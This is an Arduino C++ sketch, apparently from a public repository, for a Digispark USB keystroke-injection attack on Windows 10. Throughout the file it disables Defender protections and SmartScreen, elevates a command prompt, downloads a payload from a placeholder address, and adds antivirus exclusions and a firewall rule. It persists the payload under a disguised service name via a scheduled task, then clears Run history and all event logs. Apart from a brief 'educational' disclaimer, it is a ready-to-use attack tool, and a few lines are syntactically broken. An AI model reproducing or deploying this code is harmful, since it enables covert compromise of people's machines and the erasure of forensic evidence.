/*C++

Author: graylagx2

Name: FractureSec

Description:        This arduino sketch uses the Digispark Attiny85 DigiKeyboard library 
                    to carry out a HID attack on a Windows 10 machine. The attack consists of 
                    disabling Windows Security settings for "Real-Time Monitoring"  Bypassing UAC 
                    and launching an admin command prompt. Then passing commands to the prompt to download 
                    the payload, add exclusions in virus and security for the payload attempts to further
                    disarm Windows then with taskscheduler schedule our payload to start.
                    
Disclaimer:         This is open source from https://github.com/graylagx2 and is intended only for educational
                    purposes. Use in a controlled environment only. By using this sofware you agree you are 
                    responsible for any laws you break.   
                    
Warning:            Line number 112 requires you to change the download web address. Further all file paths are set to
                    example: "C:\\Program Files (x86)\\MicrosoftLagService.zip". Take note of these paths or modify as needed.
                    Inspect the registry edits this script performs you may not need them all.

*/

#include <DigiKeyboard.h>

// Some extra keys for the Keyboard we will need
#define KEY_ESC     41
#define KEY_DELETE  0x2A   
#define KEY_TAB     43
#define KEY_SPACE   44

void setup() {
  // There is not setup needed to use the DigiKeyboard
}

/*
!!  DigiKeyboard.sendKeyStroke are in reverse order  !!
*/
// A small function to make pressing enter easier
void enum_enter() {
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
}

void disarm_defender() {
   // Open the windows search from taskbar
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);

  // Open Windows Security settings
  DigiKeyboard.print(F("Windows Security settings"));
  DigiKeyboard.delay(700);
  enum_enter();
  DigiKeyboard.delay(4600);

  // Tab down to Virus and Protection
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  enum_enter();
  DigiKeyboard.delay(2600);

  // Tab down to manage settings. Loop tab x 4 (0,1,2,3)
  for (int i = 0; i <= 3; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(500);
  }
  DigiKeyboard.delay(500);
  enum_enter();
  DigiKeyboard.delay(2000);

  // Turn off windows defender Real Time Protection
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);

  // Close the two windows that we have opened
  for (int i = 0; i <= 1; i++) {
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(700);
  }
  DigiKeyboard.delay(1000);
}

// A function to bypass user account controls
void bypass_UAC() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell Start-Process cmd -Verb runAs"));
  DigiKeyboard.delay(500);
  enum_enter();
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(3000);
  // This backspace is incase the user doesnt have confirmation enabled.
  // we dont want "y" in the beggining of our commands
  DigiKeyboard.sendKeyStroke(KEY_DELETE);
  DigiKeyboard.delay(200);

  // Hide the prompt
  DigiKeyboard.println("mode con cols=20 lines=1");
  enum_enter();
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_M);
   Use the left arrow 
  for (int i = 0; i <= 29; i++) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(5);
  }
  DigiKeyboard.delay(400);
}

void commands() {
  // Download the payload                                  -- change me --
  DigiKeyboard.print(F("powershell Invoke-WebRequest 'download address goes here' -Outfile 'C:\\Program Files (x86)\\MicrosoftLagService.zip'"));
  enum_enter();  
  DigiKeyboard.delay(12600);

  // Comment out next section if unzipping isnt necessary
  // Unzip the payload
  DigiKeyboard.print(F("powershell Expand-Archive -Force 'C:\\Program Files (x86)\\MicrosoftLagService.zip' 'C:\\Program Files (x86)\\MicrosoftLagService'"));
  enum_enter();  
  DigiKeyboard.delay(4600);

  // Add exclusions for windows security
  DigiKeyboard.print(F("powershell Add-MpPreference -ExclusionProcess 'C:\\Program Files (x86)\\MicrosoftLagService\\MicrosoftLagService-master\\MicrosoftLagService.exe'"));
  enum_enter();  
  DigiKeyboard.delay(400);

  // Unblock some file types
  DigiKeyboard.print(F("powershell unblock-file -path 'C:\\Program Files (x86)\\MicrosoftLagService\\MicrosoftLagService-master\\MicrosoftLagService.exe'"));
  enum_enter();  
  DigiKeyboard.delay(400);

  // Diasable Windows Defender anti-spyware
  DigiKeyboard.print(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f  /v DisableAntiSpyware /t REG_DWORD /d 1 > NUL"));
  enum_enter();  
  DigiKeyboard.delay(400);

  // Disable Windows Defender Cloud
  DigiKeyboard.print(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" /f  /v SpynetReporting /t REG_DWORD /d 0 > NUL"));
  enum_enter();  
  DigiKeyboard.delay(400);
  DigiKeyboard.print(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" /f  /v SubmitSamplesConsent /t REG_DWORD /d 0 > NUL"));
  enum_enter();  
  DigiKeyboard.delay(400);  
  
  // Disable Windows Defender SmartScreen to stop it from scanning files before executing
  DigiKeyboard.print(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /f  /v EnableSmartScreen /t REG_DWORD /d 0 > NUL"));
  enum_enter();  
  DigiKeyboard.delay(400);
    
  // Add a firewall rule for payload
  DigiKeyboard.print(F("netsh advfirewall firewall add rule name=\"MsLgSrv\" dir=in action=allow program=\"C:\\Program Files (x86)\\MicrosoftLagService\\MicrosoftLagService-master\\MicrosoftLagService.exe\" enable=yes"));
  enum_enter();  
  DigiKeyboard.delay(400);  

  // If Task Scheduler isnt started lets start it then schedule our payload for onstart
  DigiKeyboard.print(F("net start | find \"Task Scheduler\" > NUL || net start \"Task Scheduler\""));
  enum_enter();  
  DigiKeyboard.delay(400);  
  DigiKeyboard.print(F("SCHTASKS /CREATE /SC ONSTART /TN \"MicrosoftLagService\" /TR \"C:\\Program Files (x86)\\MicrosoftLagService\\MicrosoftLagService-master\\MicrosoftLagService.exe\""));
  enum_enter();  
  DigiKeyboard.delay(400);  

  // Now we start our payload manually for immediate use as admin
  DigiKeyboard.print(F("start \"\"  \"C:\\Program Files (x86)\\MicrosoftLagService\\MicrosoftLagService-master\\MicrosoftLagService.exe\""));
  enum_enter();  
  DigiKeyboard.delay(400);  

  /*Cleaning up our tracks
  Clear run window history*/
  DigiKeyboard.print(F("powershell Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue"));
  enum_enter();  
  DigiKeyboard.delay(400);  

  // Clear all event logs
  DigiKeyboard.print(F("for /f \"tokens=*\" %1 in ('wevtutil.exe. el') do wevtutil.exe cl \"%%1\""));
  enum_enter();  
  DigiKeyboard.delay(400);
  
  // Exit the prompt
  DigiKeyboard.print(F("exit");
}

void loop() {
  // This is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

// Calling the functions from above

  disarm_defender();
  
  bypass_UAC();  

  commands();

  // The cheesy way to stop the loop
  exit(0);
}
